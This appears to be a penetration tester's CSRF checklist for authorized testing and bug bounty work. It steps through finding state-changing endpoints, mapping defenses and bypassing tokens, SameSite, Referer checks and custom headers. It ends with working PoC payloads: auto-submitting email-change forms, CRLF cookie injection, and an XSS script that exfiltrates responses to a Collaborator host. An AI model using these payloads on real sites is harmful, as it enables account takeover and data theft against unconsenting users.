# CSRF Testing Checklist

> **Phase:** Post-recon. Traffic is captured. You are logged in as a test user with a valid session.

---

## Step 1 — Identify State-Changing Authenticated Actions

Walk the application and flag every page or endpoint that performs one of the following. Note the URL, HTTP method, and request body for each.

### Account & Profile
- [ ] Change email address
- [ ] Change password
- [ ] Change username / display name
- [ ] Change phone number
- [ ] Update profile picture / avatar
- [ ] Change date of birth
- [ ] Change physical address
- [ ] Change language / region / timezone
- [ ] Delete profile / personal data

### Security Settings
- [ ] Enable / disable two-factor authentication (2FA)
- [ ] Add / remove trusted devices
- [ ] Change security questions or answers
- [ ] Change recovery email or recovery phone
- [ ] Revoke all active sessions / sign out everywhere
- [ ] View or rotate backup codes

### Financial & Billing
- [ ] Add / remove payment method (card, bank account)
- [ ] Change default payment method
- [ ] Change billing address
- [ ] Make a purchase or initiate a payment
- [ ] Transfer / withdraw funds
- [ ] Cancel subscription
- [ ] Upgrade / downgrade plan
- [ ] Redeem a coupon or gift card

### Access & Permissions
- [ ] Invite users to an account / organisation
- [ ] Remove users from an account / organisation
- [ ] Change a user's role or permissions
- [ ] Grant / revoke admin access
- [ ] Accept or decline an invitation

### Connected Services & OAuth
- [ ] Connect / disconnect a third-party OAuth application
- [ ] Authorise a third-party app
- [ ] Revoke a third-party app's access
- [ ] Link / unlink a social account (Google, GitHub, etc.)

### API & Developer Settings
- [ ] Generate an API key or token
- [ ] Revoke / delete an API key or token
- [ ] Create / delete a webhook
- [ ] Create / delete an SSH key or GPG key

### Content & Data
- [ ] Submit a form that stores user-supplied data (feedback, contact, reviews)
- [ ] Delete a post, file, or user-generated content item
- [ ] Change privacy settings (public / private account)
- [ ] Request a data export
- [ ] Request account deletion

### Communication Preferences
- [ ] Subscribe / unsubscribe from email notifications
- [ ] Change notification preferences
- [ ] Opt in / out of marketing communications

### GET-Based State Changes
These are endpoints that mutate state via a GET request. They are trivially exploitable via an `<img>` tag or direct link — no form required.

- [ ] `GET /delete?id=...` or any deletion triggered by URL
- [ ] `GET /approve?request_id=...` — approving a pending action
- [ ] `GET /deactivate?user_id=...` or activate
- [ ] `GET /unsubscribe?email=...` or `?token=...`
- [ ] `GET /accept?invite=...` — accepting an invitation via link
- [ ] `GET /confirm?action=...` — confirming any destructive action
- [ ] `GET /transfer?to=...&amount=...` — any financial GET action
- [ ] `GET /revoke?token=...` — revoking a token or session via link
- [ ] `GET /promote?user=...` — role or permission change via URL
- [ ] `GET /close-account` or any account lifecycle action via URL

> For each target, record: URL, HTTP method, all parameters, and whether a CSRF token or custom header is present in the request.

---

## Step 2 — Map the Defenses Present on Each Target

Run all five checks for every target identified in Step 1 before attempting any bypass. A single endpoint can have multiple layers.

### 2a — CSRF Token
- [ ] Intercept the request in Burp and inspect the request body and headers
- [ ] Look for a hidden input field in the page source with common names:
  `csrf`, `_csrf`, `csrfToken`, `csrf_token`, `authenticity_token`, `__RequestVerificationToken`, `_token`, `security_token`
- [ ] Look for a token in a custom request header:
  `X-CSRF-Token`, `X-CSRFToken`, `X-Requested-With`
- [ ] If a token is found, check whether the same value also appears in a cookie (→ double-submit pattern, see 2d)

### 2b — SameSite Cookie Attribute
- [ ] Find the `Set-Cookie` response header for the session cookie (check the login response or any authenticated response)
- [ ] Record the SameSite value:

| Value                   | Meaning                                          |
| ----------------------- | ------------------------------------------------ |
| `SameSite=Strict`       | Cookie never sent on cross-site requests         |
| `SameSite=Lax`          | Cookie sent on top-level GET navigations only    |
| `SameSite=None; Secure` | Cookie always sent — no SameSite protection      |
| absent                  | Browser defaults to `Lax` in Chrome/Edge/Firefox |

### 2c — Referer / Origin Header Validation
- [ ] In Burp Repeater, remove the `Referer` header entirely and resend — note if the request is rejected
- [ ] In Burp Repeater, remove the `Origin` header entirely and resend — note if the request is rejected
- [ ] In Burp Repeater, change `Referer` to `https://evil.com` and resend — note if rejected

### 2d — Double-Submit Cookie Pattern
- [ ] Compare the CSRF token value in the form body with any CSRF-named cookie in the request
- [ ] If both exist and share the same value → double-submit cookie pattern

### 2e — Custom Request Headers
- [ ] Look for non-standard headers in the intercepted request: `X-Requested-With: XMLHttpRequest`, `X-Custom-Header`, etc.
- [ ] In Burp Repeater, remove the custom header and resend — if it still succeeds, the header is not enforced

### Defense Routing Table

Use this to determine which bypass steps to run:

| Defense Found | Bypass Step |
|---|---|
| No defenses at all | → Step 9 (PoC — Basic) |
| CSRF token present | → Step 3 |
| SameSite=Lax (explicit or default) | → Step 4 |
| SameSite=Strict | → Step 5 |
| Referer / Origin validation | → Step 6 |
| Double-submit cookie | → Step 3c |
| Custom request header only | → Step 7 |
| GET-based state change | → Step 8 |

---

## Step 3 — CSRF Token Bypass Tests

Run these in order. Stop at the first one that succeeds.

### 3a — Validation depends on request method
The server only validates the token on POST. Switching to GET skips the check.

- [ ] In Burp Repeater, right-click → **Change request method** to convert the POST to a GET
- [ ] Forward the GET — if it succeeds, the endpoint is vulnerable

### 3b — Validation depends on token being present
The server validates the token if present but does nothing if it's missing entirely.

- [ ] In Burp Repeater, remove the `csrf` parameter from the request body entirely
- [ ] Forward the request — if it succeeds, the check is bypassed

### 3c — Token not tied to user session
The server maintains a pool of valid tokens not linked to specific sessions — an attacker's valid unused token works for any user.

- [ ] Intercept your own change-email (or equivalent) request and note the `csrf` token value
- [ ] **Drop** the request in Burp so the token is never consumed
- [ ] Use that token value in the form payload delivered to the victim

### 3d — Token tied to non-session cookie (csrfKey)
The token is validated against a separate `csrfKey` cookie rather than the session cookie. If you can inject that cookie into the victim's browser, you can pair it with a known token.

- [ ] Capture a valid `csrfKey` cookie and its corresponding `csrf` token from your own session
- [ ] Find a CRLF injection point in the application (commonly the `search` or redirect parameter)
- [ ] Inject your `csrfKey` cookie into the victim's browser via the CRLF vector before submitting the form:

```
/?search=x%0d%0aSet-Cookie:%20csrfKey=YOUR-CSRF-KEY;%20SameSite=None;%20Secure
```

- [ ] Deliver the payload (see Step 9 — Token tied to non-session cookie PoC)

### 3e — Double-submit cookie (token duplicated in cookie)
The server only checks that the `csrf` POST parameter matches the `csrf` cookie — no secret is involved. Injecting an arbitrary value into both bypasses the check.

- [ ] Find a CRLF injection point to set an arbitrary `csrf` cookie value
- [ ] Submit the form with the same arbitrary value as the `csrf` POST parameter
- [ ] Deliver the payload (see Step 9 — Double-submit PoC)

---

## Step 4 — SameSite Lax Bypass Tests

### 4a — Method override (`_method=POST`)
Some frameworks honour a `_method` parameter to tunnel POST through a GET request. Lax allows GET navigations cross-site.

- [ ] In Burp Repeater, change the request to GET and append `_method=POST` as a parameter
- [ ] Forward the request — if it succeeds, the framework supports method override
- [ ] Deliver via `document.location` (see Step 9 — SameSite Lax method override PoC)

### 4b — Client-side redirect gadget
Find an on-site redirect that you can point at the target action. Because the final request originates from the same site, Lax allows the cookie.

- [ ] Browse the application for client-side redirects that use a URL parameter to determine the destination:
  - Post-submission confirmation pages (`/confirmation?redirect=...`)
  - Comment or feedback redirect parameters
  - Any page that does `window.location = getParam('next')`
- [ ] Test whether path traversal in the parameter reaches the target action URL
- [ ] Deliver via `document.location` pointing at the gadget (see Step 9 — SameSite Lax client-side redirect PoC)

---

## Step 5 — SameSite Strict Bypass Tests

### 5a — Client-side redirect gadget (same as 4b)
Strict blocks all cross-site requests including top-level navigations. An on-site redirect gadget changes the origin of the final request to same-site.

- [ ] Follow the same gadget hunt as Step 4b
- [ ] If a redirect gadget is found, test path traversal to reach the target action

### 5b — Sibling domain with XSS (Burp Collaborator)
If the session cookie is shared across subdomains, a XSS on any sibling domain can issue a same-site request that Strict allows.

- [ ] Identify subdomains that share the session cookie (check the `Domain=` attribute on the cookie)
- [ ] Check those subdomains for XSS vulnerabilities
- [ ] If XSS is found, use Burp Collaborator to exfiltrate the result of the CSRF request
- [ ] Deliver via the XSS payload on the sibling domain (see Step 9 — Sibling domain PoC)

---

## Step 6 — Referer / Origin Header Bypass Tests

### 6a — Validation only when header is present
The server skips validation entirely if the header is absent.

- [ ] Confirmed in Step 2c — if removing the `Referer` header caused the request to succeed, this is the bypass
- [ ] Add `<meta name="referrer" content="no-referrer">` to the exploit page to suppress the header

### 6b — Broken Referer validation (contains check)
The server checks that the target domain appears somewhere in the `Referer` URL rather than validating the full origin.

- [ ] In Burp Repeater, set `Referer: https://evil.com/?target.com` and resend
- [ ] If it succeeds, use `history.pushState` to append the target domain as a query string to your exploit URL and set `Referrer-Policy: unsafe-url` in the exploit server head (see Step 9 — Broken Referer PoC)

---

## Step 7 — Custom Request Header Bypass

- [ ] If removing the custom header in Step 2e caused the request to succeed → no additional bypass needed, use the basic PoC without that header
- [ ] If the header is enforced, note that simple form submissions cannot set arbitrary headers — this is a blocker for form-based CSRF. Document as an informational finding.

---

## Step 8 — GET-Based CSRF

GET-based state changes require no form and no user interaction beyond loading a page. The browser sends the session cookie automatically.

- [ ] For each GET-based target from Step 1, confirm the action completes when you visit the URL directly in a logged-in browser
- [ ] Deliver via an `<img>` tag (victim's browser fires the request on page load):

```html
<img src="https://target.com/delete?id=123" style="display:none">
```

- [ ] Or via direct link in a phishing message — victim needs only to click the link while logged in

---

## Step 9 — PoC Templates

### Basic POST (no defenses)

```html
<form method="POST" action="https://target.com/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

### GET-based via image tag

```html
<img src="https://target.com/action?param=value" style="display:none">
```

### SameSite Lax — method override

```html
<script>
  document.location = "https://target.com/my-account/change-email?email=attacker@evil.com&_method=POST";
</script>
```

### SameSite Lax / Strict — client-side redirect gadget

```html
<script>
  document.location = "https://target.com/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker@evil.com%26submit=1";
</script>
```

### SameSite Strict — sibling domain XSS (Burp Collaborator)

```html
<!-- Delivered from XSS on vulnerable-subdomain.target.com -->
<script>
  fetch('https://target.com/my-account/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'email=attacker@evil.com'
  }).then(r => r.text()).then(d => {
    fetch('https://YOUR-COLLABORATOR-PAYLOAD.burpcollaborator.net?exfil=' + btoa(d));
  });
</script>
```

### Token tied to non-session cookie — CRLF injection

```html
<form method="POST" action="https://target.com/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">
</form>
<img src="https://target.com/?search=x%0d%0aSet-Cookie:%20csrfKey=YOUR-CSRF-KEY;%20SameSite=None;%20Secure"
     onerror="document.forms[0].submit()">
```

### Double-submit cookie — CRLF injection

```html
<form method="POST" action="https://target.com/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="faketoken123">
</form>
<img src="https://target.com/?search=x%0d%0aSet-Cookie:%20csrf=faketoken123;%20SameSite=None;%20Secure"
     onerror="document.forms[0].submit()">
```

### Referer suppression (validation only when present)

```html
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://target.com/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

### Broken Referer validation (contains check)

> Add to exploit server **Head**: `Referrer-Policy: unsafe-url`

```html
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form method="POST" action="https://target.com/my-account/change-email">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>
      history.pushState('', '', '/?target.com');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Step 10 — Host and Deliver the PoC

**Python HTTP server (local test)**
```bash
python3 -m http.server 8080
```

**Ngrok (public delivery)**
```bash
ngrok http 8080
```

**VPS**
```bash
scp index.html user@your-vps:/var/www/html/poc.html
```

- [ ] Test the PoC from the hosted URL in your own browser while logged in as the test user before delivering
- [ ] For bug bounty reports, record a screen capture showing the full attack completing end-to-end

---

## Notes

<!-- Add target-specific findings, endpoint URLs, token names, cookie values, and observations here -->
